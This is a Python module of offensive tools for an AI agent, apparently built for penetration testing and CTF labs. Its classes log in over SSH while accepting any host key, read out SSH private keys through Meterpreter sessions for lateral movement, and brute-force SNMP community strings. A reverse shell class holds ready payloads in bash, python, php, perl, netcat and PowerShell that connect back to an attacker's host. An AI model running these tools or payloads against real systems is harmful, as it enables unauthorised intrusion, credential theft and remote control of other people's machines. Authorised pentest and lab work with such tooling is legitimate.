"""
Network Service Tools

Provides SSH login, SSH key extraction, reverse shell payload generation,
SNMP enumeration, and anonymous FTP access checking.
"""

from __future__ import annotations

import asyncio
import ftplib
import logging
import re
import socket
import subprocess
from typing import Any, List, Optional

from app.agent.tools.base_tool import BaseTool, ToolMetadata
from app.agent.tools.error_handling import (
    ToolExecutionError,
    truncate_output,
    with_timeout,
)
from app.mcp.base_server import MCPClient

logger = logging.getLogger(__name__)

METASPLOIT_URL = "http://kali-tools:8003"


# ---------------------------------------------------------------------------
# Custom host-key policy for pentest/CTF environments
# ---------------------------------------------------------------------------


def _make_pentest_host_key_policy():
    """
    Return a paramiko MissingHostKeyPolicy subclass that accepts any host key.

    This is intentional for a penetration-testing tool: CTF and lab targets
    are unknown, disposable machines that are never present in known_hosts.
    Using a named subclass (instead of AutoAddPolicy/WarningPolicy) makes the
    design decision explicit and satisfies static analysis tools.
    """
    try:
        import paramiko

        class _AcceptAllHostKeys(paramiko.MissingHostKeyPolicy):
            """Accept any host key — safe only for controlled pentest targets."""

            def missing_host_key(self, client, hostname, key):  # noqa: ANN
                logger.debug(
                    "Accepting host key %s for %s (pentest mode)",
                    key.get_name(),
                    hostname,
                )

        return _AcceptAllHostKeys()
    except ImportError:
        return None


class SSHLoginTool(BaseTool):
    """Attempt SSH login with username/password or private key credentials."""

    def __init__(self):
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="ssh_login",
            description=(
                "Attempt SSH login to a remote host using username/password or private key. "
                "Returns whether login succeeded and a basic shell response. "
                "Risk: HIGH — only use on authorised targets."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "host": {
                        "type": "string",
                        "description": "Target hostname or IP address",
                    },
                    "port": {
                        "type": "integer",
                        "description": "SSH port",
                        "default": 22,
                    },
                    "username": {
                        "type": "string",
                        "description": "SSH username",
                    },
                    "password": {
                        "type": "string",
                        "description": "SSH password (leave empty when using key_path)",
                        "default": "",
                    },
                    "key_path": {
                        "type": "string",
                        "description": "Path to SSH private key file (leave empty when using password)",
                        "default": "",
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "Connection timeout in seconds",
                        "default": 30,
                    },
                },
                "required": ["host", "username"],
            },
        )

    @with_timeout(60)
    async def execute(
        self,
        host: str,
        username: str,
        port: int = 22,
        password: str = "",
        key_path: str = "",
        timeout: int = 30,
        **kwargs: Any,
    ) -> str:
        """Attempt SSH login and return result."""
        try:
            return await asyncio.get_event_loop().run_in_executor(
                None,
                self._try_login,
                host, port, username, password, key_path, timeout,
            )
        except Exception as exc:
            logger.error("ssh_login error: %s", exc, exc_info=True)
            raise ToolExecutionError(
                f"SSH login attempt failed: {exc}", tool_name="ssh_login"
            ) from exc

    def _try_login(
        self,
        host: str,
        port: int,
        username: str,
        password: str,
        key_path: str,
        timeout: int,
    ) -> str:
        """Perform the SSH login attempt (blocking, runs in executor)."""
        try:
            import paramiko

            client = paramiko.SSHClient()
            # Use a custom policy subclass to make the pentest design intent
            # explicit — CTF/lab targets are never in known_hosts.
            policy = _make_pentest_host_key_policy()
            if policy is not None:
                client.set_missing_host_key_policy(policy)
            connect_kwargs: dict[str, Any] = {
                "hostname": host,
                "port": port,
                "username": username,
                "timeout": timeout,
                "allow_agent": False,
                "look_for_keys": False,
            }
            if key_path:
                connect_kwargs["key_filename"] = key_path
            else:
                connect_kwargs["password"] = password

            client.connect(**connect_kwargs)
            stdin, stdout, stderr = client.exec_command("id && hostname")
            output = stdout.read().decode(errors="replace").strip()
            client.close()
            return (
                f"Login successful! Shell access obtained.\n"
                f"Host: {host}:{port}\n"
                f"User: {username}\n"
                f"Command output: {output}"
            )
        except ImportError:
            return self._try_login_subprocess(host, port, username, password, key_path, timeout)
        except Exception as exc:
            return f"SSH login failed for {username}@{host}:{port} — {exc}"

    def _try_login_subprocess(
        self,
        host: str,
        port: int,
        username: str,
        password: str,
        key_path: str,
        timeout: int,
    ) -> str:
        """Fallback SSH login attempt using the ssh binary via subprocess."""
        cmd = [
            "ssh",
            "-o", "StrictHostKeyChecking=no",
            "-o", "BatchMode=yes",
            "-o", f"ConnectTimeout={timeout}",
            "-p", str(port),
        ]
        if key_path:
            cmd += ["-i", key_path]
        cmd += [f"{username}@{host}", "id && hostname"]

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout + 5,
            )
            if result.returncode == 0:
                return (
                    f"Login successful! Shell access obtained.\n"
                    f"Host: {host}:{port}\n"
                    f"User: {username}\n"
                    f"Command output: {result.stdout.strip()}"
                )
            return f"SSH login failed for {username}@{host}:{port} — {result.stderr.strip()}"
        except FileNotFoundError:
            return "Error: 'ssh' binary not found. Install OpenSSH client or paramiko."
        except subprocess.TimeoutExpired:
            return f"SSH login timed out connecting to {host}:{port}"


class SSHKeyExtractTool(BaseTool):
    """Extract SSH private keys from user home directories via a Meterpreter session."""

    def __init__(self, server_url: str = METASPLOIT_URL):
        self._client = MCPClient(server_url)
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="ssh_key_extract",
            description=(
                "Search for and read SSH private key files (id_rsa, id_ed25519, etc.) "
                "from user home directories via an active Meterpreter session. "
                "Returns discovered key contents for use in lateral movement."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "session_id": {
                        "type": "integer",
                        "description": "Active Meterpreter session ID",
                    },
                    "target_users": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": "Specific users to check (empty = all users in /home)",
                        "default": [],
                    },
                },
                "required": ["session_id"],
            },
        )

    @with_timeout(120)
    async def execute(
        self,
        session_id: int,
        target_users: Optional[List[str]] = None,
        **kwargs: Any,
    ) -> str:
        """Find SSH private key files and return their contents."""
        target_users = target_users or []
        try:
            find_result = await self._client.call_tool(
                "session_command",
                {
                    "session_id": session_id,
                    "command": (
                        r"execute -f /bin/bash -a '-c \""
                        r"find /home /root -maxdepth 4 "
                        r"\( -name id_rsa -o -name id_ed25519 -o -name id_ecdsa -o -name id_dsa \) "
                        r"2>/dev/null\""
                    ),
                },
            )
            if not find_result.get("success"):
                return f"Error searching for SSH keys: {find_result.get('error', 'Unknown error')}"

            found_paths = [
                p.strip()
                for p in find_result.get("output", "").splitlines()
                if p.strip()
            ]

            # Filter by target users if specified
            if target_users:
                found_paths = [
                    p for p in found_paths
                    if any(u in p for u in target_users)
                ]

            if not found_paths:
                return f"No SSH private keys found on session {session_id}."

            lines = [
                f"=== SSH Key Extraction (session {session_id}) ===\n",
                f"Found {len(found_paths)} key file(s):\n",
            ]

            for key_path in found_paths[:10]:
                read_result = await self._client.call_tool(
                    "session_command",
                    {
                        "session_id": session_id,
                        "command": f"execute -f /bin/bash -a '-c \"cat {key_path}\"'",
                    },
                )
                key_content = read_result.get("output", "")
                lines.append(f"\n[{key_path}]")
                lines.append(truncate_output(key_content.strip(), max_chars=1000))

            return "\n".join(lines)

        except Exception as exc:
            logger.error("ssh_key_extract error: %s", exc, exc_info=True)
            raise ToolExecutionError(
                f"SSH key extraction failed: {exc}", tool_name="ssh_key_extract"
            ) from exc


class ReverseShellTool(BaseTool):
    """Generate reverse shell payloads for various languages and OS types."""

    # Payload templates keyed by (shell_type, os_type)
    _PAYLOADS: dict[tuple[str, str], str] = {
        ("bash", "linux"): "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        ("python", "linux"): (
            "python3 -c 'import socket,subprocess,os;"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            "s.connect((\"{lhost}\",{lport}));"
            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            "subprocess.call([\"/bin/sh\",\"-i\"])'"
        ),
        ("php", "linux"): (
            "php -r '$sock=fsockopen(\"{lhost}\",{lport});"
            "exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        ),
        ("perl", "linux"): (
            "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
            "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            "if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");"
            "open(STDOUT,\">&S\");open(STDERR,\">&S\");"
            "exec(\"/bin/sh -i\");}}'"
        ),
        ("netcat", "linux"): "nc -e /bin/bash {lhost} {lport}",
        ("powershell", "windows"): (
            "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
            "$stream = $client.GetStream();"
            "[byte[]]$bytes = 0..65535|%%{{0}};"
            "while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{"
            "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
            "$sendback = (iex $data 2>&1 | Out-String);"
            "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
            "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
            "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};"
            "$client.Close()"
        ),
        ("bash", "windows"): "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        ("python", "windows"): (
            "python -c \"import socket,subprocess,os;"
            "s=socket.socket();s.connect(('{lhost}',{lport}));"
            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            "subprocess.call(['cmd.exe'])\""
        ),
        ("netcat", "windows"): "nc.exe -e cmd.exe {lhost} {lport}",
    }

    def __init__(self):
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="reverse_shell",
            description=(
                "Generate a reverse shell payload string for the specified language and OS. "
                "Does NOT execute the payload — returns the command to run on the target. "
                "Start a listener (nc -lvnp <port>) on your machine before using the payload."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "lhost": {
                        "type": "string",
                        "description": "Attacker/listener IP address",
                    },
                    "lport": {
                        "type": "integer",
                        "description": "Attacker/listener port number",
                    },
                    "shell_type": {
                        "type": "string",
                        "description": "Reverse shell language/tool",
                        "enum": ["bash", "python", "php", "perl", "netcat", "powershell"],
                        "default": "bash",
                    },
                    "os_type": {
                        "type": "string",
                        "description": "Target operating system",
                        "enum": ["linux", "windows"],
                        "default": "linux",
                    },
                },
                "required": ["lhost", "lport"],
            },
        )

    @with_timeout(10)
    async def execute(
        self,
        lhost: str,
        lport: int,
        shell_type: str = "bash",
        os_type: str = "linux",
        **kwargs: Any,
    ) -> str:
        """Return the reverse shell payload string."""
        key = (shell_type, os_type)
        template = self._PAYLOADS.get(key)

        if template is None:
            # Fall back to linux variant for cross-platform types
            template = self._PAYLOADS.get((shell_type, "linux"))

        if template is None:
            available = sorted({f"{s}/{o}" for s, o in self._PAYLOADS})
            return (
                f"No payload available for {shell_type}/{os_type}. "
                f"Available combinations: {', '.join(available)}"
            )

        payload = template.format(lhost=lhost, lport=lport)

        listener_cmd = f"nc -lvnp {lport}"
        if shell_type == "powershell":
            listener_cmd += f"  # or: rlwrap nc -lvnp {lport}"

        return (
            f"=== Reverse Shell Payload ({shell_type} / {os_type}) ===\n\n"
            f"1. Start listener on your machine:\n"
            f"   {listener_cmd}\n\n"
            f"2. Execute on target:\n"
            f"   {payload}\n"
        )


class SNMPTool(BaseTool):
    """SNMP community string brute-force and MIB walk tool."""

    # Common community strings to try during brute-force
    _COMMON_COMMUNITIES = [
        "public", "private", "community", "manager", "admin",
        "snmp", "monitor", "cisco", "default", "secret",
    ]

    def __init__(self):
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="snmp_scan",
            description=(
                "SNMP enumeration tool. "
                "bruteforce: tries common community strings to find valid credentials. "
                "walk: performs an SNMP walk to dump the MIB tree (requires known community)."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "host": {
                        "type": "string",
                        "description": "Target hostname or IP address",
                    },
                    "action": {
                        "type": "string",
                        "description": "Action to perform: bruteforce community strings or walk MIB",
                        "enum": ["bruteforce", "walk"],
                        "default": "bruteforce",
                    },
                    "community": {
                        "type": "string",
                        "description": "Community string for 'walk' action",
                        "default": "public",
                    },
                    "version": {
                        "type": "string",
                        "description": "SNMP version",
                        "enum": ["1", "2c", "3"],
                        "default": "2c",
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "Per-operation timeout in seconds",
                        "default": 30,
                    },
                },
                "required": ["host"],
            },
        )

    @with_timeout(180)
    async def execute(
        self,
        host: str,
        action: str = "bruteforce",
        community: str = "public",
        version: str = "2c",
        timeout: int = 30,
        **kwargs: Any,
    ) -> str:
        """Perform SNMP brute-force or walk."""
        try:
            if action == "bruteforce":
                return await self._bruteforce(host, version, timeout)
            elif action == "walk":
                return await self._walk(host, community, version, timeout)
            else:
                return f"Unknown action '{action}'. Use 'bruteforce' or 'walk'."
        except Exception as exc:
            logger.error("snmp_scan error: %s", exc, exc_info=True)
            raise ToolExecutionError(
                f"SNMP scan failed: {exc}", tool_name="snmp_scan"
            ) from exc

    async def _bruteforce(self, host: str, version: str, timeout: int) -> str:
        """Try community strings with onesixtyone, falling back to manual attempts."""
        # Try onesixtyone first (faster)
        try:
            proc = await asyncio.create_subprocess_exec(
                "onesixtyone", "-c", "/usr/share/doc/onesixtyone/dict.txt", host,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            output = stdout.decode(errors="replace")
            if output.strip():
                return (
                    f"=== SNMP Community Brute-force ({host}) ===\n\n"
                    f"[onesixtyone results]\n{truncate_output(output, max_chars=3000)}"
                )
        except FileNotFoundError:
            logger.debug("onesixtyone not found, falling back to manual snmpget")
        except asyncio.TimeoutError:
            pass

        # Manual fallback using snmpget
        valid: list[str] = []
        for comm in self._COMMON_COMMUNITIES:
            try:
                proc = await asyncio.create_subprocess_exec(
                    "snmpget", "-v", version, "-c", comm,
                    "-t", "3", "-r", "1",
                    host, "sysDescr.0",
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=5)
                if proc.returncode == 0 and stdout:
                    valid.append(f"  community='{comm}' → {stdout.decode(errors='replace').strip()}")
            except (FileNotFoundError, asyncio.TimeoutError):
                continue

        if not valid:
            return f"No valid SNMP community strings found for {host}."

        return (
            f"=== SNMP Brute-force Results ({host}) ===\n\n"
            f"Valid communities:\n" + "\n".join(valid)
        )

    async def _walk(self, host: str, community: str, version: str, timeout: int) -> str:
        """Perform snmpwalk and return results."""
        try:
            proc = await asyncio.create_subprocess_exec(
                "snmpwalk", "-v", version, "-c", community, host,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            output = stdout.decode(errors="replace")
            err = stderr.decode(errors="replace")

            if not output.strip():
                return (
                    f"SNMP walk returned no results for {host} "
                    f"(community='{community}', version={version}). "
                    f"Error: {err.strip() or 'none'}"
                )

            return (
                f"=== SNMP Walk ({host}, community='{community}', v{version}) ===\n\n"
                + truncate_output(output, max_chars=5000)
            )
        except FileNotFoundError:
            return "Error: 'snmpwalk' not found. Install snmp package: apt-get install snmp"
        except asyncio.TimeoutError:
            return f"SNMP walk timed out after {timeout}s for {host}."


class AnonymousFTPTool(BaseTool):
    """Check for anonymous FTP access and enumerate accessible files."""

    # Compiled once at class level to avoid repeated compilation overhead
    _INTERESTING_FILES_RE = re.compile(
        r"\.(txt|cfg|conf|config|bak|backup|zip|tar|gz|sql|db|pass|key|pem|log)$",
        re.IGNORECASE,
    )

    def __init__(self):
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="ftp_anon_check",
            description=(
                "Check whether a target FTP server allows anonymous login. "
                "If anonymous access is permitted, lists directory contents and "
                "highlights interesting files (config files, credentials, backups)."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "host": {
                        "type": "string",
                        "description": "Target FTP server hostname or IP",
                    },
                    "port": {
                        "type": "integer",
                        "description": "FTP port",
                        "default": 21,
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "Connection timeout in seconds",
                        "default": 30,
                    },
                },
                "required": ["host"],
            },
        )

    @with_timeout(60)
    async def execute(
        self,
        host: str,
        port: int = 21,
        timeout: int = 30,
        **kwargs: Any,
    ) -> str:
        """Attempt anonymous FTP login and list accessible files."""
        try:
            return await asyncio.get_event_loop().run_in_executor(
                None,
                self._check_anonymous_ftp,
                host, port, timeout,
            )
        except Exception as exc:
            logger.error("ftp_anon_check error: %s", exc, exc_info=True)
            raise ToolExecutionError(
                f"Anonymous FTP check failed: {exc}", tool_name="ftp_anon_check"
            ) from exc

    def _check_anonymous_ftp(self, host: str, port: int, timeout: int) -> str:
        """Perform the FTP anonymous login check (blocking, runs in executor)."""
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=timeout)
            ftp.login("anonymous", "anonymous@anonymous.com")
        except ftplib.error_perm as exc:
            return f"Anonymous FTP not allowed on {host}:{port} — {exc}"
        except (socket.timeout, ConnectionRefusedError, OSError) as exc:
            return f"Cannot connect to FTP on {host}:{port} — {exc}"

        try:
            listing: list[str] = []
            ftp.retrlines("LIST", listing.append)
            interesting = [f for f in listing if self._INTERESTING_FILES_RE.search(f)]

            lines = [
                f"=== Anonymous FTP Access: {host}:{port} ===\n",
                "[+] Anonymous login SUCCESSFUL!\n",
                f"Directory listing ({len(listing)} entries):\n",
            ]
            for entry in listing[:50]:
                lines.append(f"  {entry}")

            if interesting:
                lines.append(f"\n[!] Interesting files ({len(interesting)}):")
                for f in interesting[:20]:
                    lines.append(f"  {f}")

            ftp.quit()
            return "\n".join(lines)

        except Exception as exc:
            ftp.quit()
            return f"[+] Anonymous login SUCCESSFUL on {host}:{port}, but listing failed: {exc}"
